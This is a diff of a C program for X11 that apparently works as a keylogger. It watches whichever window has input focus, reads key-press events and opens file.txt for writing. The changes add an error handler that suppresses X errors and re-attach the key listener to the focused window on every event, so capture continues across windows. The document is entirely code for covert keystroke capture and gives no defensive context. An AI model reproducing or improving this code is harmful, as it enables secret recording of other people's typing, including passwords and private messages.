@@ -5,6 +5,12 @@
 #include <stdlib.h>
 
 
+int handlerXorg(Display* display, XErrorEvent* error)
+{
+	printf("Got error\n");
+	return 0;
+}
+
 int main()
 {
 #ifdef DEBUG
@@ -29,6 +35,7 @@ int main()
 	XGetInputFocus(d, &curFocus, &revert);
 	XSelectInput(d, curFocus, KeyPressMask | KeyReleaseMask | FocusChangeMask);
 
+
 	FILE *f = fopen("file.txt", "w");
 	if (f == NULL)
 	{
@@ -36,22 +43,16 @@ int main()
 		return 1;
 	}
 	
-
+	XSetErrorHandler(handlerXorg);
+	Window init = curFocus;
 	while (1)
 	{
 		XEvent ev;
 		XNextEvent(d, &ev);
+		XGetInputFocus(d, &curFocus, &revert);
+		XSelectInput(d, curFocus, KeyPressMask | KeyReleaseMask | FocusChangeMask);
 		switch (ev.type)
 		{
-		case FocusOut:
-			if (curFocus != root)
-				XSelectInput(d, curFocus, 0);
-			XGetInputFocus(d, &curFocus, &revert);
-			if (curFocus == PointerRoot)
-				curFocus = root;
-			XSelectInput(d, curFocus, KeyPressMask | KeyReleaseMask | FocusChangeMask);
-			break;
-
 		case KeyPress:
 			
 			len = XLookupString(&ev.xkey, buf, 16, &ks, &comp);
